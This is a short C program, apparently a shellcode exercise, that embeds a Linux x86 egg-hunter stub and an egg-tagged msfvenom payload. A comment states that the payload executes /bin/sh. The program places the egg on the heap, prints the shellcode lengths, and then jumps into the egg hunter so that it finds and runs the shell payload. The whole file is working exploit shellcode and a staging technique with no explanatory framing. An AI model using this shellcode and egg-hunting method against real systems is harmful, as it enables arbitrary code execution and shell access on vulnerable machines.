#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EGGMARK "\x90\x50\x90\x50"

unsigned char egghunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xcb\xff\x0f\xbf\x91\x50\x90\x50\x4f\x43\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xe7\x39\x3b\x75\xf2\x8d\x43\x04\xff\xe0";

unsigned char egg[] = \
EGGMARK
"\xbd\x64\xb2\x0c\xf4\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" // msfvenom -p linux/x86/exec CMD=/bin/sh -f c -b \x00
"\x0b\x83\xc2\x04\x31\x6a\x11\x03\x6a\x11\xe2\x91\xd8\x07\xac"
"\xc0\x4f\x7e\x24\xdf\x0c\xf7\x53\x77\xfc\x74\xf4\x87\x6a\x54"
"\x66\xee\x04\x23\x85\xa2\x30\x3b\x4a\x42\xc1\x13\x28\x2b\xaf"
"\x44\xdf\xc3\x2f\xcc\x4c\x9a\xd1\x3f\xf2";

void main()
{

	char *shellcode_heap = malloc(sizeof(egg)); // shellcode egg + egg mark
	memcpy(shellcode_heap, egg, sizeof(egg));

	printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
	printf("Egg shellcode Length:  %d\n", strlen(shellcode_heap));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
